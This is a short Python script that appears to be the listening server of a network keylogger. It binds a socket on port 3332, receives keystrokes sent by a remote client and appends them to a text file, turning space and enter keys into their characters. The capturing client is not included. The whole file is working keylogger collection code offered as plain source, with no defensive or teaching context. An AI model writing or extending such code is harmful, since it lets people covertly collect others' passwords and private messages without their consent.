from pynput import keyboard
import socket
import threading
#Remember to uninstall pynobjc

#Socket
#Automatically retrieves IP Address of user
IP = socket.gethostname()

port = 3332
ADDR = (IP, port)

#Anything which hits the address (ADDR) will hit the socket specified within the server variable
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

if __name__ == "__main__":
    print("Listening")
    server.listen()
    #Stores socket and address of new connection
    conn, addr = server.accept()
    while True:
        keypressed = conn.recvfrom(1024)[0].decode("utf-8")
        file = open("User_Keystrokes.txt", "a+")

        if len(keypressed) < 4:
            file.write(keypressed[1])
            file.close()
            #print("called 1")

        elif keypressed == "Key.space":
            file.write(" ")
            file.close()
            #print("called 2")
        
        elif keypressed == "Key.enter":
            file.write("\n")
            #print("called 3")

        elif keypressed == "b\' \'":
            print("User Terminationed Connection")
            exit()

        #print(keypressed[1])

    
                 